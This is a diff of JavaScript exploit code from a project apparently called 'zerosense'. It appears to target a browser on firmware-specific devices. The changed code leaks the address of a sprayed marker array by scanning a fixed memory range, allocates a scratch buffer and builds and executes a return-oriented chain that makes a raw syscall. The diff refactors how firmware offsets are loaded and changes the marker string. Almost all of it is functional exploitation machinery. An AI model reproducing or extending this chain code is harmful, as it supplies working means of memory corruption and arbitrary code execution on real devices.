@@ -7,12 +7,13 @@ var ChainBuilder = require('zerosense/ChainBuilder');
 var Logger = require('zerosense/Logger');
 var MemoryReader = require('zerosense/MemoryReader');
 var Searcher = require('zerosense/Searcher');
-var OffsetsUtil = require('zerosense/OffsetsUtil');
+var Offsets = require('zerosense/Offsets');
 var Util = require('zerosense/Util');
 
 var logger = null;
 
 var memoryReader = null;
+var offsets = null;
 var searcher = null;
 
 (function() {
@@ -57,7 +58,7 @@ var searcher = null;
 		memoryReader = new MemoryReader();
 		searcher = new Searcher(memoryReader);
 		
-		window.Offsets = OffsetsUtil.get(environment.dex, environment.firmware);
+		offsets = Offsets.get(environment);
 
 		////////////////////
 
@@ -94,7 +95,7 @@ function init(step = 0, data = null) {
 	
 	if (step === 1) {
 		arrayLeaker = new ArrayLeaker(memoryReader);
-		arrayLeaker.createArray(11, "c0ffee33");
+		arrayLeaker.createArray(10, "Obey the moderator");
 		
 		var searchStart = 0x80190000;
 		var searchEnd = 0x80600000;
@@ -109,10 +110,7 @@ function init(step = 0, data = null) {
 		
 		logger.info(`Found leakArray at 0x${data.match.toString(16)}`);
 		arrayLeaker.setAddress(data.match);
-		step++;
-	}
-	
-	if (step === 3) {
+		
 		logger.info("Initialized.");
 	}
 }
@@ -124,7 +122,16 @@ function createChain() {
 	
 	addrChainStart = null;
 	
-	var chain2 = new ChainBuilder().syscall(0x188, 0x1004, 0xA, 0x1B6, 0, 0, 0, 0, 0).create();
+	var gtemp = Util.pad(0x1000);
+	arrayLeaker.setString(3, gtemp);
+	var addrGtemp = arrayLeaker.getStringAddress(3);
+	if (addrGtemp === null) {
+		logger.error("Failed to get gtemp address.");
+		return;
+	}
+	logger.info(`Found gtemp at 0x${addrGtemp.toString(16)}`);
+	
+	var chain2 = new ChainBuilder(offsets).setGtemp(addrGtemp).syscall(0x188, 0x1004, 0xA, 0x1B6, 0, 0, 0, 0, 0).create();
 	arrayLeaker.setString(2, chain2);
 	var addrChain2 = arrayLeaker.getStringAddress(2);
 	if (addrChain2 === null) {
@@ -175,7 +182,7 @@ function executeChain() {
 	}
 	
 	execute(addrChainStart, () => {
-		window.logger.info("Executed chain.");
+		logger.info("Executed chain.");
 	});
 }
 
